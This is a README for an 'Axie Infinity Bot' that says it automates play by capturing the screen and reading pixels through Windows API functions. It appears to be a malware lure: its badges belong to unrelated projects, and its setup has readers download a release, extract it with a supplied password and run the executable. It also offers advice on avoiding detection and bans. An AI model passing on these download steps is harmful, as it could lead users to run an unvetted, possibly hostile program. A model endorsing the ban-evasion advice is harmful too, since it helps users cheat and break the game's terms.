## Axie Infinity Bot
<p align="center">
  <a href="https://www.npmjs.com/package/hashlips_art_engine">
    <img alt="downloads" src="https://img.shields.io/npm/dm/hashlips_art_engine.svg?color=blue" target="_blank" />
  </a>
  <a href="https://github.com/kefranabg/readme-md-generator/blob/master/LICENSE">
    <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-yellow.svg" target="_blank" />
  </a>
  <a href="https://codecov.io/gh/kefranabg/readme-md-generator">
    <img src="https://codecov.io/gh/kefranabg/readme-md-generator/branch/master/graph/badge.svg" />
  </a>
  <a href="https://github.com/frinyvonnick/gitmoji-changelog">
    <img src="https://img.shields.io/badge/changelog-gitmoji-brightgreen.svg" alt="gitmoji-changelog">
  </a>
  <a href="https://twitter.com/axieinfinity">
    <img alt="Twitter: axieinfinity" src="https://img.shields.io/twitter/follow/axieinfinity.svg?style=social" target="_blank" />
  </a>
  <br>
</p>

Automated bot for playing Axie Infinity using Windows API functions for safe interaction with the game.

### About
The Axie Infinity Bot leverages Windows API functions to take screenshots and recognize pixels of Axie models and cards. This approach is safer compared to methods that require reading the game process memory or injecting .dll files, as it minimizes the risk of detection and bans.

### Windows API Functions Used
- GetDC and ReleaseDC
Description: GetDC retrieves a handle to a device context (DC) for the client area of a specified window or for the entire screen. ReleaseDC releases the device context.
Usage: The bot uses GetDC to capture the screen or the game window, enabling it to analyze the current state of the game. After capturing the necessary data, ReleaseDC is called to free the handle.

- BitBlt
Description: This function performs a bit-block transfer of color data from a source device context to a destination device context.
Usage: The bot uses BitBlt to copy pixel data from the game window to a memory device context, allowing it to process the image off-screen.

- CreateCompatibleDC and DeleteDC
Description: CreateCompatibleDC creates a memory device context compatible with the specified device, and DeleteDC deletes the memory device context.
Usage: The bot creates a compatible memory device context using CreateCompatibleDC for off-screen rendering and deletes it with DeleteDC when done.

- CreateCompatibleBitmap and DeleteObject
Description: CreateCompatibleBitmap creates a bitmap compatible with the device context, and DeleteObject deletes a logical pen, brush, font, bitmap, region, or palette.
Usage: The bot creates a compatible bitmap to store the screen capture using CreateCompatibleBitmap and deletes the bitmap with DeleteObject after processing.

- SelectObject
Description: This function selects an object into the specified device context, replacing the previous object of the same type.
Usage: The bot uses SelectObject to select the compatible bitmap into the memory device context before performing the BitBlt operation.

- GetPixel
Description: This function retrieves the color value of the pixel at specified coordinates.
Usage: The bot analyzes specific pixels in the captured screenshot to identify Axie models and cards, enabling it to make decisions based on the game's visual state.

### Setup
- Configure Game Resolution:
 - Set the Axie Infinity game resolution to full-screen (or full-screen windowed) mode.
 - Close the SkyMavis game client to ensure the bot can access the game window without interference.

- Download and Extract Files:
 - Download the latest release of the repository.
 - Extract the downloaded files using the password QaURPee9bNthgl.

- Launch the Bot:
 - Run the bot executable with the correct settings configured in the provided configuration file. Ensure the game client is running and visible on your screen.

### Warning
Usage Limitations: It is not recommended to run the bot for more than 24 hours per account. Extended use may increase the risk of detection and account suspension.
Disclaimer: The developer is not responsible for any bans or blocks that may result from using this software. Use it at your own risk.

### Copyright
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. AXIE INFINITY BOT, AXIE INFINITY AUTO BATTLE BOT, AXIE INFINITY SCRIPT.*
